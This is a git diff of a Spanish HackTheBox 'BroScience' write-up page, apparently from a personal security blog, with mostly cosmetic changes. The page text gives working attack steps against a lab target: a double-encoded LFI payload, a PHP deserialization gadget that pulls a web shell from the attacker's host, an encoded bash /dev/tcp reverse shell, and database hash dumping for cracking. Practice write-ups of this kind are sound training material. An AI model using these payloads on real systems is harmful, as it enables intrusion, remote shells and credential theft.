@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
   <title>
@@ -26,23 +26,23 @@ Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes
   
 
 BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
-<meta name="keywords" content="blog,developer,personal">
+<meta name="keywords" content="ciberseguridad, pentesting, hacking ético, HackTheBox, writeups, redes, eJPT, CWES">
 
 
 
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Broscience Machine - HackTheBox">
-  <meta name="twitter:description" content="Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes Introducción Link to heading BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Broscience Machine - HackTheBox">
+	<meta name="twitter:description" content="Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes Introducción Link to heading BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
 
 <meta property="og:url" content="https://celero0.github.io/posts/broscience/">
-  <meta property="og:site_name" content="Celero0 Blog">
-  <meta property="og:title" content="Broscience Machine - HackTheBox">
-  <meta property="og:description" content="Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes Introducción Link to heading BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-06-05T19:58:38+00:00">
-    <meta property="article:modified_time" content="2026-06-05T19:58:38+00:00">
+	<meta property="og:site_name" content="Celero0 Blog">
+	<meta property="og:title" content="Broscience Machine - HackTheBox">
+	<meta property="og:description" content="Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes Introducción Link to heading BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por root conduce al compromiso total de la máquina.">
+	<meta property="og:locale" content="es">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-06-05T19:58:38+00:00">
+		<meta property="article:modified_time" content="2026-06-05T19:58:38+00:00">
 
 
 
@@ -57,7 +57,7 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 
   
   
-  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="/css/coder.min.7931813641e92789c3090650cf34e053bf0a09b258f1e73ca3b5ba54e5c35b4f.css" integrity="sha256-eTGBNkHpJ4nDCQZQzzTgU78KCbJY8ec8o7W6VOXDW08=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -67,13 +67,19 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
   
 
 
 
  
 
+
+  
+  
+    
+    <link rel="stylesheet" href="/scss/custom.min.940f835c40977fce2ddd2fd8c55eb94de7e488a3ba45c0396d26445901b77774.css" integrity="sha256-lA&#43;DXECXf84t3S/YxV65TefkiKO6RcA5bSZEWQG3d3Q=" crossorigin="anonymous" media="screen" />
+  
 
 
 
@@ -102,7 +108,7 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 
 
 
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-dark">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -129,6 +135,14 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
           
             <li class="navigation-item">
               <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/labs/">Labs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Proyectos</a>
             </li>
           
             <li class="navigation-item">
@@ -160,12 +174,12 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2026-06-05T19:58:38Z">
-                June 5, 2026
+                5 de junio de 2026
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              10-minute read
+              10 minutos de lectura.
             </span>
           </div>
           
@@ -197,11 +211,11 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
   </a>
 </h1>
 <p>Realizamos un escaneo completo de puertos en busca de servicios expuestos:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.228.129 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.228.129 -oG allPorts
 </span></span></code></pre></div><p>Obteniendo los siguientes puertos abiertos:</p>
 <img src="/images/Pasted image 20260604174047.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>A continuación, realizamos un escaneo de versiones y scripts sobre los puertos identificados:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,512,513,514 -sCV 10.129.228.129 -oN portServices
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,512,513,514 -sCV 10.129.228.129 -oN portServices
 </span></span></code></pre></div><img src="/images/Pasted image 20260604174155.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Durante la enumeración se identifica el dominio <code>broscience.htb</code>, asociado al servicio web. Por ello, añadimos la entrada correspondiente en nuestro archivo <code>/etc/hosts</code>.</p>
 <img src="/images/Pasted image 20260604174319.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -233,14 +247,14 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
   </a>
 </h1>
 <p>Si realizamos la siguiente petición, la aplicación detecta el intento de acceso a archivos arbitrarios mediante un ataque de <code>LFI</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=/etc/passwd&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=/etc/passwd&#34;</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20260604182606.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para evadir esta validación, aplicamos una doble codificación URL (<code>double URL encoding</code>) a la ruta solicitada:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34&#34;</span>
 </span></span></code></pre></div><p>La técnica resulta efectiva, permitiendo la lectura arbitraria de archivos del sistema.</p>
 <img src="/images/Pasted image 20260604182753.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Aprovechando esta vulnerabilidad, descargamos el archivo <code>utils.php</code> para analizar su código fuente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%37%35%25%37%34%25%36%39%25%36%63%25%37%33%25%32%65%25%37%30%25%36%38%25%37%30&#34;</span> -o includes.php
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%37%35%25%37%34%25%36%39%25%36%63%25%37%33%25%32%65%25%37%30%25%36%38%25%37%30&#34;</span> -o includes.php
 </span></span></code></pre></div><h1 id="generando-código-de-activación">
   Generando código de activación
   <a class="heading-link" href="#generando-c%c3%b3digo-de-activaci%c3%b3n">
@@ -251,7 +265,7 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 <img src="/images/Pasted image 20260604185237.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Tras revisar el código fuente, se identificó que los códigos de activación son generados mediante la función <code>generate_activation_code()</code>, la cual utiliza <code>rand()</code> para seleccionar 32 caracteres de forma pseudoaleatoria. Además, el generador es inicializado mediante <code>srand(time())</code>, utilizando como semilla la marca temporal actual del servidor.</p>
 <p>Debido a que la semilla depende únicamente del tiempo, es posible reproducir el proceso de generación si se conoce o se puede estimar el instante exacto en el que fue creado el código. Para validar esta hipótesis, se desarrolló un script en PHP que replica la lógica de la aplicación, utilizando como semilla el valor de la cabecera HTTP <code>Date</code> devuelta por el servidor.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>php <span style="color:#ff7b72;font-weight:bold">-</span>r <span style="color:#a5d6ff">&#39;function generate_activation_code() {              
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>php <span style="color:#ff7b72;font-weight:bold">-</span>r <span style="color:#a5d6ff">&#39;function generate_activation_code() {              
 </span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    $chars = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;;
 </span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    $activation_code = &#34;&#34;;
 </span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    for ($i = 0; $i &lt; 32; $i++) {
@@ -267,12 +281,12 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 <p>Enviamos la siguiente petición:</p>
 <img src="/images/Pasted image 20260604191651.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>La respuesta del servidor indica que la cuenta ha sido creada correctamente e incluye la cabecera:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Date: Thu, 04 Jun 2026 23:16:32 GMT
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Date: Thu, 04 Jun 2026 23:16:32 GMT
 </span></span></code></pre></div><img src="/images/Pasted image 20260604191732.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Utilizando esta marca temporal como semilla, reproducimos localmente el algoritmo y obtenemos el siguiente código de activación para la cuenta recién creada:</p>
 <img src="/images/Pasted image 20260604191844.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Finalmente, enviamos el código generado al endpoint de activación:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://broscience.htb/activate.php?code<span style="color:#ff7b72;font-weight:bold">=</span>9R9DnjtpJLFdJ8QabMK4K2eRJ01eBvXD
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://broscience.htb/activate.php?code<span style="color:#ff7b72;font-weight:bold">=</span>9R9DnjtpJLFdJ8QabMK4K2eRJ01eBvXD
 </span></span></code></pre></div><p>La activación se completa correctamente.</p>
 <img src="/images/Pasted image 20260604192014.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="explotación-de-deserialización-insegura">
@@ -285,10 +299,10 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 <p>Tras iniciar sesión, la aplicación establece dos cookies. La más interesante es <code>user-prefs</code>.</p>
 <img src="/images/Pasted image 20260604203013.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Si recordamos el código presente en <code>utils.php</code>, la función <code>get_theme()</code> deserializa el contenido de la cookie <code>user-prefs</code> mediante <code>unserialize()</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$up</span> <span style="color:#ff7b72;font-weight:bold">=</span> unserialize(base64_decode(<span style="color:#79c0ff">$up_cookie</span>));
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$up</span> <span style="color:#ff7b72;font-weight:bold">=</span> unserialize(base64_decode(<span style="color:#79c0ff">$up_cookie</span>));
 </span></span></code></pre></div><p>Dado que el valor de esta cookie es completamente controlado por el usuario, un atacante puede suministrar objetos PHP arbitrarios durante el proceso de deserialización, dando lugar a una vulnerabilidad de <strong>PHP Object Injection</strong>.</p>
 <p>Además, el archivo define la clase <code>AvatarInterface</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72">class</span> <span style="color:#f0883e;font-weight:bold">AvatarInterface</span> {
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72">class</span> <span style="color:#f0883e;font-weight:bold">AvatarInterface</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">public</span> <span style="color:#79c0ff">$tmp</span>;
 </span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">public</span> <span style="color:#79c0ff">$imgPath</span>;
 </span></span><span style="display:flex;"><span>    
@@ -300,11 +314,11 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 </span></span></code></pre></div><p>Cuando un objeto de esta clase es deserializado, PHP ejecuta automáticamente el método mágico <code>__wakeup()</code>, el cual invoca la función <code>save()</code> de la clase <code>Avatar</code>. Debido a que ambas propiedades pueden ser controladas por el atacante, es posible influir directamente en el comportamiento de dicho método.</p>
 <p>Esto convierte a <code>AvatarInterface</code> en un gadget válido dentro de una cadena de explotación de deserialización insegura.</p>
 <p>Para explotar la vulnerabilidad, creamos una instancia de la clase <code>AvatarInterface</code> y configuramos manualmente sus propiedades:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$obj</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> AvatarInterface();
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$obj</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">new</span> AvatarInterface();
 </span></span><span style="display:flex;"><span><span style="color:#79c0ff">$obj</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>tmp <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://10.10.14.146:8000/shell.php&#34;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#79c0ff">$obj</span><span style="color:#ff7b72;font-weight:bold">-&gt;</span>imgPath <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/var/www/html/shell.php&#34;</span>;
 </span></span></code></pre></div><p>Posteriormente, serializamos el objeto y codificamos el resultado en Base64 para obtener un valor apto para ser enviado en la cookie <code>user-prefs</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72">echo</span> base64_encode(serialize(<span style="color:#79c0ff">$obj</span>));
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72">echo</span> base64_encode(serialize(<span style="color:#79c0ff">$obj</span>));
 </span></span></code></pre></div><p>Cuando la aplicación procesa la cookie y ejecuta <code>unserialize()</code>, PHP reconstruye el objeto <code>AvatarInterface</code> y ejecuta automáticamente su método mágico <code>__wakeup()</code>. Como consecuencia, se invoca la función <code>save()</code> utilizando valores completamente controlados por el atacante, desencadenando la acción definida por la cadena de deserialización.</p>
 <p>El script completo y su resultado se muestran a continuación:</p>
 <img src="/images/Pasted image 20260604203550.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -317,14 +331,14 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 <p>Tras recargar la página, el servidor realiza una petición hacia nuestro equipo atacante.</p>
 <img src="/images/Pasted image 20260604203825.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Finalmente, accedemos al archivo generado en el servidor web:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/shell.php?0=ls&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/shell.php?0=ls&#34;</span>
 </span></span></code></pre></div><p>Confirmando la obtención de ejecución remota de comandos (RCE):</p>
 <img src="/images/Pasted image 20260604203918.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para obtener una shell interactiva, nos ponemos en escucha con <code>penelope</code> en el puerto <code>4455</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>penelope -p <span style="color:#a5d6ff">4455</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>penelope -p <span style="color:#a5d6ff">4455</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20260604204913.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>A continuación, ejecutamos el siguiente comando a través de la web shell para obtener una reverse shell:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/shell.php?0=printf+KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ2LzQ0NTUgMD4mMSkgJg==|base64+-d|bash&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -k <span style="color:#a5d6ff">&#34;https://broscience.htb/shell.php?0=printf+KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ2LzQ0NTUgMD4mMSkgJg==|base64+-d|bash&#34;</span>
 </span></span></code></pre></div><p>Como resultado, obtenemos una shell interactiva como el usuario <code>www-data</code>.</p>
 <img src="/images/Pasted image 20260604205005.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="movimiento-lateral">
@@ -337,33 +351,33 @@ BroScience es una máquina Linux de dificultad media centrada en la explotación
 <p>Al revisar el archivo <code>/var/www/html/includes/db_connect.php</code>, encontramos información sensible, incluyendo credenciales de acceso a la base de datos y el valor de la <code>salt</code> utilizada por la aplicación.</p>
 <img src="/images/Pasted image 20260604210730.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Con esta información podemos conectarnos a la base de datos PostgreSQL mediante las credenciales recuperadas:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>psql -h localhost -p <span style="color:#a5d6ff">5432</span> --username<span style="color:#ff7b72;font-weight:bold">=</span>dbuser -W broscience
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>psql -h localhost -p <span style="color:#a5d6ff">5432</span> --username<span style="color:#ff7b72;font-weight:bold">=</span>dbuser -W broscience
 </span></span></code></pre></div><img src="/images/Pasted image 20260604211228.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Una vez dentro de la base de datos, podemos listar las tablas existentes utilizando el siguiente comando:</p>
 <pre tabindex="0"><code class="language-psql" data-lang="psql">\dt
 </code></pre><img src="/images/Pasted image 20260604211528.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Entre las tablas identificadas destaca <code>users</code>, por lo que procedemos a examinar su estructura:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">\d</span> users
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">\d</span> users
 </span></span></code></pre></div><p>Observamos que contiene, entre otras, las columnas <code>username</code> y <code>password</code>.</p>
 <img src="/images/Pasted image 20260604211545.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para recuperar los datos almacenados en dichas columnas ejecutamos la siguiente consulta:</p>
 <pre tabindex="0"><code class="language-psql" data-lang="psql">select username,password from users;
 </code></pre><img src="/images/Pasted image 20260604211651.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>La consulta devuelve los hashes de las contraseñas de los usuarios registrados. Exportamos esta información a nuestra máquina local para intentar descifrarlos, teniendo en cuenta que la aplicación utiliza la <code>salt</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>NaCl
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>NaCl
 </span></span></code></pre></div><p>Para que <code>John</code> interprete correctamente el formato utilizado por la aplicación, almacenamos los hashes con la siguiente estructura:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>usuario:$dynamic_4$hash_en_md5$salt
